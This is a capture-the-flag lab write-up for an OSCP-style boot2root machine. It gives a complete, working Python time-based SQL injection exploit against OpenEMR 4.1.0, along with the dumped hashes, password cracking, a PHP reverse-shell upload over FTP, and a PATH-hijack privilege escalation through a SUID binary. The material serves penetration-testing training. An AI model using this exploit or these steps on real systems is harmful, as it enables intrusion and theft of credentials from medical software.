

## Description

Level: Intermediate

Description:This machine was developed to train the student to think according to the OSCP methodology. Pay attention to each step, because if you lose something you will not reach the goal: to become root in the system.

It is boot2root, tested on VirtualBox (but works on VMWare) and has two flags: user.txt and root.txt.

## Scanning

```console

└─$ sudo nmap -sT -A -Pn -n -T4 192.168.110.25
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-25 17:51 CEST
Nmap scan report for 192.168.110.25
Host is up (0.00010s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.3d
80/tcp open  http    Apache httpd 2.2.17 ((PCLinuxOS 2011/PREFORK-1pclos2011))
| http-robots.txt: 8 disallowed entries 
| /manual/ /manual-2.2/ /addon-modules/ /doc/ /images/ 
|_/all_our_e-mail_addresses /admin/ /
|_http-server-header: Apache/2.2.17 (PCLinuxOS 2011/PREFORK-1pclos2011)
|_http-title: Coming Soon 2

Network Distance: 1 hop
Service Info: OS: Unix

```


```bash


└─$ gobuster dir -w directory-list-2.3-big.txt -u http://192.168.110.25  -t 20
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.110.25
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /home/kali/OSCP/Tools/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/10/26 06:50:58 Starting gobuster in directory enumeration mode
===============================================================
/index                (Status: 200) [Size: 5031]
/images               (Status: 301) [Size: 344] [--> http://192.168.110.25/images/]
/css                  (Status: 301) [Size: 341] [--> http://192.168.110.25/css/]   
/js                   (Status: 301) [Size: 340] [--> http://192.168.110.25/js/]    
/vendor               (Status: 301) [Size: 344] [--> http://192.168.110.25/vendor/]
/favicon              (Status: 200) [Size: 1406]                                   
/robots               (Status: 200) [Size: 620]                                    
/fonts                (Status: 301) [Size: 343] [--> http://192.168.110.25/fonts/] 
/gitweb               (Status: 301) [Size: 344] [--> http://192.168.110.25/gitweb/]
/phpMyAdmin           (Status: 403) [Size: 59]                                     
/server-status        (Status: 403) [Size: 1000]                                   
/server-info          (Status: 403) [Size: 1000]                                   
/openemr              (Status: 301) [Size: 345] [--> http://192.168.110.25/openemr/]
                                                                                    
===============================================================
2021/10/26 06:55:21 Finished
===============================================================
       
```


## Search exploit OpenEMR 4.1.0


```python

# Exploit Title: OpenEMR 4.1.0 - 'u' SQL Injection
# Date: 2021-04-03
# Exploit Author: Michael Ikua
# Vendor Homepage: https://www.open-emr.org/
# Software Link: https://github.com/openemr/openemr/archive/refs/tags/v4_1_0.zip
# Version: 4.1.0
# Original Advisory: https://www.netsparker.com/web-applications-advisories/sql-injection-vulnerability-in-openemr/

#!/usr/bin/env python3

import requests
import string
import sys

all = string.printable
# edit url to point to your openemr instance
url = "http://192.168.110.25/openemr/interface/login/validateUser.php?u="

def extract_users_num():
    print("[+] Finding number of users...")
    for n in range(1,100):
        payload = '\'%2b(SELECT+if((select count(username) from users)=' + str(n) + ',sleep(3),1))%2b\''
        r = requests.get(url+payload)
        if r.elapsed.total_seconds() > 3:
            user_length = n
            break
    print("[+] Found number of users: " + str(user_length))
    return user_length

def extract_users():
    users = extract_users_num()
    print("[+] Extracting username and password hash...")
    output = []
    for n in range(1,1000):
        payload = '\'%2b(SELECT+if(length((select+group_concat(username,\':\',password)+from+users+limit+0,1))=' + str(n) + ',sleep(3),1))%2b\''
        #print(payload)
        r = requests.get(url+payload)
        #print(r.request.url)
        if r.elapsed.total_seconds() > 3:
            length = n
            break
    for i in range(1,length+1):
        for char in all:
            payload = '\'%2b(SELECT+if(ascii(substr((select+group_concat(username,\':\',password)+from+users+limit+0,1),'+ str(i)+',1))='+str(ord(char))+',sleep(3),1))%2b\''
            #print(payload)
            r = requests.get(url+payload)
            #print(r.request.url)
            if r.elapsed.total_seconds() > 3:
                output.append(char)
                if char == ",":
                    print("")
                    continue
                print(char, end='', flush=True)


try:
    extract_users()
except KeyboardInterrupt:
    print("")
    print("[+] Exiting...")
    sys.exit()

```

## Found username and hashes password


```bash

└─$ python3 49742.py                                                                    1 ⨯

[+] Finding number of users...
[+] Found number of users: 2
[+] Extracting username and password hash...
admin:3863efef9ee2bfbc51ecdca359c6302bed1389e8
medical:ab24aed5a7c4ad45615cd7e0da816eea39e4895d                                            

```

## Crack password


```bash



└─$ john  hash --format=Raw-SHA1
└─$ john  hash -show
admin:ackbar
medical:medical

```

## Upload reserse shell via FTP service

```bash
# medical:medical

$ ftp 192.168.110.25 
ftp> cd /var/www/html/openemr
ftp> mput php-reverse-shell.php

```

## Upload reserse shell via Open EMR admin interface

    Administration --> Files --> config.php



## Escale privileges 



    sh-4.1$ id
    uid=479(apache) gid=416(apache) groups=416(apache)
    sh-4.1$ find / -perm -u=s -type f 2>/dev/null
    find / -perm -u=s -type f 2>/dev/null

    /usr/bin/healthcheck
    sh-4.1$ ls -al /usr/bin/healthcheck
    -rwsr-sr-x 1 root root 5813 Jul 29  2020 /usr/bin/healthcheck
    ls -al /usr/bin/healthcheck
    sh-4.1$ strings /usr/bin/healthcheck
    clear ; echo 'System Health Check' ; echo '' ; echo 'Scanning System' ; sleep 2 ; ifconfig ; fdisk -l ; du -h

    sh-4.1$ cd /tmp
    sh-4.1$ export PATH=/tmp:$PATH
    sh-4.1$ echo $PATH
    /tmp:/sbin:/usr/sbin:/bin:/usr/bin

    sh-4.1$ cat ifconfig
    /bin/sh
    sh-4.1$ chmod +x ifconfig
    sh-4.1$ /usr/bin/healthcheck
    TERM environment variable not set.
    System Health Check

    Scanning System
    id
    uid=0(root) gid=0(root) groups=0(root),416(apache)
    shutdown -h now


